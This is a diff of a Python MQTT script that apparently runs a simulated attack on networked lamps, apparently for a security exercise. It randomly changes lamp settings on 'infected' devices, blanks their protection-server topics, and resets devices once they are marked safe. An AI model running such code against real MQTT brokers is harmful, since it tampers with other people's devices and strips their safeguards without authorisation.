@@ -42,6 +42,11 @@ def on_message_srv(mqttc, obj, msg):
         if status == len(server_names):
             print("\033[32mDevice " + dev + " in safety!\033[0m")
             infected.pop(dev, None)
+            # set to predefined state
+            mqttc.publish(MQTTBAS + "/" + dev + "/lamp", "off", 1)
+            mqttc.publish(MQTTBAS + "/" + dev + "/lamp/color", "#dec0de", 1)
+            mqttc.publish(MQTTBAS + "/" + dev + "/lamp/mode", "rgb", 1)
+            mqttc.publish(MQTTBAS + "/" + dev + "/lamp", "on", 1)
 
 def on_message_init(mosq, obj, msg):
     global infected
@@ -69,27 +74,34 @@ def attack():
                 state = random.choice(["on", "off"])
                 mode = random.choice(["dimmer", "rgb"])
                 # attack on devices
-                mqttc.publish(MQTTBAS + "/" + dev + "/lamp/value", str(value))
-                mqttc.publish(MQTTBAS + "/" + dev + "/lamp/color", "rgba(" + str(color_r) + "," + str(color_g) + "," + str(color_b) + ", 0)")
-                mqttc.publish(MQTTBAS + "/" + dev + "/lamp/mode", mode)
-                mqttc.publish(MQTTBAS + "/" + dev + "/lamp", state)
                 if time_left == 0:
                     time_left = seconds
                     # destroy bad protection
                     for srv in server_names:
                         mqttc.publish(MQTTBAS + "/" + dev + "/servers/" + srv, "")
+                    # set to predefined state
+                    color_r = 208
+                    color_g = 13
+                    color_b = 173
+                    state = "on"
+                    mode = "rgb"
+
+                mqttc.publish(MQTTBAS + "/" + dev + "/lamp/value", str(value))
+                mqttc.publish(MQTTBAS + "/" + dev + "/lamp/color", "rgba(" + str(color_r) + "," + str(color_g) + "," + str(color_b) + ", 0)")
+                mqttc.publish(MQTTBAS + "/" + dev + "/lamp/mode", mode)
+                mqttc.publish(MQTTBAS + "/" + dev + "/lamp", state)
                 print(dev, end=", ")
             print("\b\b ")
         time.sleep(1)
 
 thread = Thread(target = attack, args = ())
 thread.daemon = True
-thread.start()
 mqttc = mqtt.Client()
 mqttc.message_callback_add(MQTTBAS + "/+/lamp/init", on_message_init)
 mqttc.message_callback_add(MQTTBAS + "/+/servers/#", on_message_srv)
 mqttc.on_connect = on_connect
 mqttc.username_pw_set(MQTTUSR, MQTTPWD)
 mqttc.connect(MQTTSRV, MQTTPRT, 60)
+thread.start()
 mqttc.subscribe(MQTTBAS + "/#", 0)
 mqttc.loop_forever()
